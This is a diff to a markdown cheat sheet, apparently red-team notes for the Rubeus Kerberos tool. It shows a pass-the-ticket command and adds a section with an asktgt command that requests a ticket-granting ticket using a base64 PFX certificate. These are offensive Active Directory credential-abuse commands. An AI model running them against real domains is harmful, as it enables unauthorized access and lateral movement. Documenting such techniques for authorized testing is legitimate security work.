@@ -114,3 +114,16 @@ Rubeus.exe ptt /luid:$LUID /ticket:$TICKET_BASE64_STRING
 ```
 
 - `$LUID` is the logon session's ID
+
+---
+
+## Request TGT using Base64-Encoded PFX Certificate
+
+```powershell
+Rubeus.exe asktgt /user:$USERNAME /certificate:$BASE64_PFX_CERTIFICATE /password:$CERTIFICATE_PASSWORD /nowrap
+```
+
+- `$USERNAME` formats:
+	- Just the username
+	- `$DOMAIN\$USERNAME`
+	- `$USERNAME@$DOMAIN`
